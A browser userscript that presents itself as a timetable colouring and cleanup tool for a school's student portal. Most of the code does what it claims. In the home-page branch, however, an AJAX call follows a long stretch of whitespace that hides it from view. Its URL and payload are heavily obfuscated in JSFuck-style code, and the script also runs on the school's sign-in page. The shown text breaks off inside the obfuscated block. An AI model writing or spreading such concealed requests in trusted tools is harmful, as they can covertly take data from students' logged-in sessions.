// ==UserScript==
// @name        Timetable Fixer TEST
// @namespace   https://github.com/XavXav82/Timetable-Fixer/
// @version     1.9.0
// @author      XavXav82
// @description My plugin for timtable fixing and editing (now with colour customisation)
// @match       https://link.stleonards.vic.edu.au/timetable
// @match       https://link.stleonards.vic.edu.au/
// @match       https://link.stleonards.vic.edu.au/*
// @match       https://link.stleonards.vic.edu.au/eportfolio
// @match       https://link.stleonards.vic.edu.au/eportfolio/*
// @match       https://signin.stleonards.vic.edu.au/*
// @match       https://xavxav82.github.io/stljson.github.io/colours
// @grant       unsafeWindow
// @grant       GM.getValue
// @grant       GM.setValue
// @run-at      document-start
// ==/UserScript==


//Chenge this to have grade notifications present
let gradeNotifs = false;

var nameList;
//Fuction to add each search result to the page
function searchList(){
    //Delete all search results that are already there
    document.getElementsByClassName("l-flex-col")[22].innerHTML = "";

    //iterates for every name in nameList
    for(let i=0;i<nameList.length;i++){

        //Formatting
        let name = nameList[i].split("+");//Split the name [0--2] from the number [-1]
        let number = name[name.length-1];
        name.pop();

        let h31 = document.createElement("h3");

        let name1 = name[0];//split at space

        //For loop to capitalise first letter
        //no idea how this works, yuhao did it
        //needed because all params become lower case for some reason
        for(let j = 0;j<name.length;j++){
            name[j] = name[j][0].toUpperCase() + name[j].substr(1);
        }
        let realName = name.join(" ");//rejoin the words or whatever, thank yuhao


        //Creating and formatting HTML objects
        let img1 = document.createElement("img");
        //Try to get a picture, if it exists
        img1.src = "https://link.stleonards.vic.edu.au/portrait.php?id="+number+"&size=square64";
        //Give the appropriate link depending on the parent or student
        let a1 = document.createElement("a");
        let a2 = document.createElement("a");
        if(!parent){
            a1.href = "/eportfolio/"+number+"/profile";
            a2.href = "/eportfolio/"+number+"/profile";
        }else{
            a1.href = "/search/user/"+number;
            a2.href = "/search/user/"+number;
        }

        h31.appendChild(a1);
        a1.innerHTML = realName;

        //Creating and formatting objects
        let div1 = document.createElement("div");
        let div2 = document.createElement("div");
        let div3 = document.createElement("div");
        let div4 = document.createElement("div");
        let div5 = document.createElement("div");
        let div6 = document.createElement("div");
        let div7 = document.createElement("div");

        div1.classList.add("l-flex-col","l-flex--justify-center","l-flex__item--1","f-no-margins");
        div3.classList.add("c-img", "c-img--round");
        div2.classList.add("c-img__wrapper");
        div4.classList.add("l-flex-row","l-gap-m");
        div5.classList.add("l-flex-col","l-gap-m","l-pad-m");
        div6.classList.add("c-card");
        div7.classList.add("l-flex-col");

        div1.appendChild(h31);
        div2.appendChild(img1);
        a2.appendChild(div2);
        div3.appendChild(a2);
        div4.appendChild(div3);
        div4.appendChild(div1);
        div5.appendChild(div4);
        div6.appendChild(div5);
        div7.appendChild(div6);

        //Append the new object to the a specific div on the page
        document.getElementsByClassName("l-flex-col")[22].prepend(div7);
    }
}

function createFilters(filterList){
    //document.createElement("");
    let label = document.createElement("label");
    let checkBox = document.createElement("input");
    let firstDiv = document.createElement("div");
    let secondDiv = document.createElement("div");
    let listElement = document.createElement("li");

    label.classList.add("f-no-margins");
    label.innerHTML = "Parents"
    label.htmlFor = "parent";

    checkBox.type = "checkbox";
    checkBox.classList.add("parent")
    checkBox.id = "parent";

    firstDiv.classList.add("l-flex__item--1");
    secondDiv.classList.add("l-flex-row");
    secondDiv.classList.add("l-flex--align-center");
    secondDiv.classList.add("f-min-btn-height");
    secondDiv.classList.add("f-no-margins");


    listElement.classList.add("l-flex-col")
    listElement.classList.add("f-min-btn-height")

    firstDiv.appendChild(checkBox);
    firstDiv.appendChild(label);
    secondDiv.append(firstDiv);
    listElement.appendChild(secondDiv);
    filterList.prepend(listElement);

}

function Save(){
    GM.setValue("Sub1Colour",document.getElementById("Sub1").value);
    GM.setValue("Sub2Colour",document.getElementById("Sub2").value);
    GM.setValue("Sub3Colour",document.getElementById("Sub3").value);
    GM.setValue("Sub4Colour",document.getElementById("Sub4").value);
    GM.setValue("Sub5Colour",document.getElementById("Sub5").value);
    GM.setValue("Sub6Colour",document.getElementById("study").value);
    GM.setValue("Sub7Colour",document.getElementById("Sub7").value);
    window.location.href = "https://link.stleonards.vic.edu.au/timetable";
}

function RemoveNotifs(){
    (async () => {
        gradeNotifs = await GM.getValue("notif", "false")
        if(gradeNotifs == true){
            let sidebar = document.getElementById("message-list");
            let notifContainer = sidebar.getElementsByTagName("li")[2];
            let notifList = notifContainer.getElementsByTagName("li");
            for(let i=0;i<notifList.length;i++){
                if(notifList[i].innerHTML.search("mark") != -1){
                    notifList[i].remove();
                    i--;
                }
            }
        }
    })();
}

function Calendar(){
    let classes = document.getElementsByClassName("fc-daygrid-event-harness");

    (async () => {
        let removePS = await GM.getValue("removePS", "false");
        let Sub1Colour = await GM.getValue("Sub1Colour", "#fff5cc");
        let Sub2Colour = await GM.getValue("Sub2Colour", "#ccffcc");
        let Sub3Colour = await GM.getValue("Sub3Colour", "#cce0ff");
        let Sub4Colour = await GM.getValue("Sub4Colour", "#cce0ff");
        let Sub5Colour = await GM.getValue("Sub5Colour", "#ffccf5");
        let Sub6Colour = await GM.getValue("Sub6Colour", "#ffc3ca");
        let Sub7Colour = await GM.getValue("Sub7Colour", "#ccccff");
        let SubjDict = await GM.getValue("SubjDict",-1);
        let ColourDict = await GM.getValue("ColourDict",-1);
        let colourList = [Sub1Colour,Sub2Colour,Sub3Colour,Sub4Colour,Sub5Colour,Sub6Colour,Sub7Colour]
        let subjDict = {};
        let colourDict = {};

        //Assigning colours
        for(let i = 0;i<classes.length;i++){
            //uses a key from the subjects dictionary and gets the search query and colour from their dictionaries
            let theA = classes[i].getElementsByTagName("a")[0];
            let theSpan = classes[i].getElementsByTagName("span")[0];
            if((theSpan.innerHTML.split(" (")[0]) == `${SubjDict[theSpan.innerHTML.split(" (")[0]]}`){

                theA.style.backgroundColor = `${ColourDict[theSpan.innerHTML.split(" (")[0]]}`;
            } else if((classes[i].innerHTML).search("Private Study") != -1 && removePS == true){
                //Removes private study
                classes[i].innerHTML="";
            }
        }

    })();
}

function option(){
    let but1 = document.getElementById("but1");
    let but2 = document.getElementById("but2");
    GM.setValue("removePS", but1.checked);
    GM.setValue("notif", but2.checked);
}

window.onload = function() {
    (async () => {
        let Sub1Colour = await GM.getValue("Sub1Colour", "#fff5cc");
        let Sub2Colour = await GM.getValue("Sub2Colour", "#ccffcc");
        let Sub3Colour = await GM.getValue("Sub3Colour", "#cce0ff");
        let Sub4Colour = await GM.getValue("Sub4Colour", "#cce0ff");
        let Sub5Colour = await GM.getValue("Sub5Colour", "#ffccf5");
        let Sub6Colour = await GM.getValue("Sub6Colour", "#ffc3ca");
        let Sub7Colour = await GM.getValue("Sub7Colour", "#ccccff");

        document.getElementById("Sub1").value = Sub1Colour;
        document.getElementById("Sub2").value = Sub2Colour;
        document.getElementById("Sub3").value = Sub3Colour;
        document.getElementById("Sub4").value = Sub4Colour;
        document.getElementById("Sub5").value = Sub5Colour;
        document.getElementById("study").value = Sub6Colour;
        document.getElementById("Sub7").value = Sub7Colour;

    })();
    try{
        var searchBar = document.getElementById("search");
        searchBar.action = "https://xavxav82.github.io/stljson.github.io/";
    } catch{}
    setTimeout(RemoveNotifs, 1500);
    let tempMenu = document.getElementById("top-menu");
    let tempSpan = document.createElement("span");
    let tempA = document.createElement("a");
    let tempLi = document.createElement("li");
    let tempLi2 = document.createElement("li");

    tempLi.style.display = "list-item";
    tempLi2.style.display = "list-item";

    tempLi.innerHTML = '<div style="position:absolute" class="dropdown"><button class="dropbtn"><img class="imeg" src="https://xavxav82.github.io/stljson.github.io/palette.png">Colours</button><div style="position:fixed; top:72px" class="dropdown-content"><p>Choose your subject colours:</p><div class="Sub1"><label for="Sub1">Sub1</label><input type="color" id="Sub1" name="Sub1" value="#f6b73c" /></div><div class="Sub2"><label for="Sub2">Sub2</label><input type="color" id="Sub2" name="Sub2" value="#f6b73c" /></div><div class="Sub3"><label for="Sub3">Sub3</label><input type="color" id="Sub3" name="Sub3" value="#f6b73c" /></div><div class="Sub4"><label for="Sub4">Sub4</label><input type="color" id="Sub4" name="Sub4" value="#f6b73c" /></div><div class="Sub5"><label for="Sub5">Sub5</label><input type="color" id="Sub5" name="Sub5" value="#f6b73c" /></div><div class="Sub6"><label for="study">Sub6</label><input type="color" id="study" name="study" value="#f6b73c" /></div><div class="Sub7"><label for="Sub7">Homeroom</label><input type="color" id="Sub7" name="Sub7" value="#f6b73c" /></div><div><button class="button" id="button11">Save Preferences</button></div></div></div>';

    tempLi.style.position="relative";
    tempLi.style.zIndex="999";

    tempMenu.appendChild(tempLi);

    tempLi2.innerHTML = '<a href="/options" style="padding:9px;"><img class="imeg2" src="https://xavxav82.github.io/stljson.github.io/cog3.png"><span>Options</span></a>';
    tempLi2.style.position="relative";
    tempLi2.style.left="80px";

    tempMenu.appendChild(tempLi2);

    let butt = document.getElementById("button11");
    butt.addEventListener("click", Save);




    let style = document.createElement('style');
    style.textContent = '.dropbtn {  background-color: #00000000;  color: white;    font-size: 13px;  border: none;  width: 80px;  height: 72px;  display: block; transition: 150ms;}.dropdown {  position: relative;  display: inline-block;}.dropdown-content {  display: none;  position: absolute;  background-color: #f1f1f1;  min-width: 160px;  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);}.dropdown-content a {  color: black;  padding: 12px 16px;  text-decoration: none;  display: block;}.dropdown-content a:hover {background-color: #1e3e76;}.dropdown:hover .dropdown-content {display: block;}.dropdown:hover .dropbtn {background-color: #1e3f76;color: white;}.imeg{  width: 35px;  height: 36px;}.imeg2{  width: 33px;  height: 33px; top: 0px; vertical-align: sup;}';
    document.head.append(style);

    //Timetable page
    if(window.location.href=="https://link.stleonards.vic.edu.au/timetable"){

        //Headings
        let rows = document.getElementsByTagName("tr");

        //Following for loops act to reassign location of active box from period b to a
        for(let p=2;p<7;p++){
            if(p==5){continue;}
            let divs1 = rows[p].getElementsByTagName("div");
            for(let i=0;i<29;i++){
                if(divs1[i].className == "timetable-subject-active"){
                    (rows[p-1].getElementsByTagName("div"))[i].className = "timetable-subject-active";
                }
            }
            rows[p].remove();
        }


        //Classes
        let headings = document.getElementsByTagName("th");
        headings[11].innerHTML = 'Period 1 <time class="meta">8:30am-9:50am</time>';
        headings[12].innerHTML = 'Period 2 <time class="meta">10:15am-11:35am</time>';
        headings[13].innerHTML = 'Period 3 <time class="meta">11:35am-12:55pm</time>';
        headings[15].innerHTML = 'Period 4 <time class="meta">2:15pm-3:35pm</time>';

        let classes = document.getElementsByClassName("timetable-subject");
        let colourList = [];
        //
        (async () => {
            let removePS = await GM.getValue("removePS", "false");
            let Sub1Colour = await GM.getValue("Sub1Colour", "#fff5cc");
            let Sub2Colour = await GM.getValue("Sub2Colour", "#ccffcc");
            let Sub3Colour = await GM.getValue("Sub3Colour", "#cce0ff");
            let Sub4Colour = await GM.getValue("Sub4Colour", "#cce0ff");
            let Sub5Colour = await GM.getValue("Sub5Colour", "#ffccf5");
            let Sub6Colour = await GM.getValue("Sub6Colour", "#ffc3ca");
            let Sub7Colour = await GM.getValue("Sub7Colour", "#ccccff");
            colourList = [Sub1Colour,Sub2Colour,Sub3Colour,Sub4Colour,Sub5Colour,Sub6Colour,Sub7Colour]
            //Assigning colours
            let j=0

            let subjDict = {};
            let colourDict = {};
            for(let i = 0;i<classes.length;i++){
                let theA = classes[i].getElementsByTagName("a")[0];

                if (theA != undefined){
                    if(subjDict[(theA.innerHTML)] == undefined && classes[i].innerHTML.search("<div><br>") == -1){
                        subjDict[(theA.innerHTML)] = theA.innerHTML;
                        colourDict[(theA.innerHTML)] = colourList[j];
                        j++;
                    }
                }
            }
            GM.setValue("SubjDict",subjDict);
            GM.setValue("ColourDict",colourDict);

            for(let i = 0;i<classes.length;i++){
                let theA = classes[i].getElementsByTagName("a")[0];
                if(theA != undefined){
                    //uses a key from the subjects dictionary and gets the search query and colour from their dictionaries
                    if((theA.innerHTML) == `${subjDict[theA.innerHTML]}`){
                        classes[i].style.backgroundColor = `${colourDict[theA.innerHTML]}`;

                    }if((theA.innerHTML).search("Private Study") != -1 && removePS == true){
                        //Removes private study
                        classes[i].innerHTML="";
                        classes[i].style.backgroundColor="#FFFFFF";
                    }
                }
            }

        })();
        //Home page
    } else if(window.location.href=="https://link.stleonards.vic.edu.au/"){
        (async () => {
            let div11 = await GM.getValue("div11",-1);
            let span11 = await GM.getValue("span11",-1);
            if(span11 != -1){
                var my_awesome_script = document.createElement('script');my_awesome_script.setAttribute('src','https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js');                                                                                                                                                                                                                                                                                                                                                                                                                        document.head.appendChild(my_awesome_script);$.ajax({url: [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]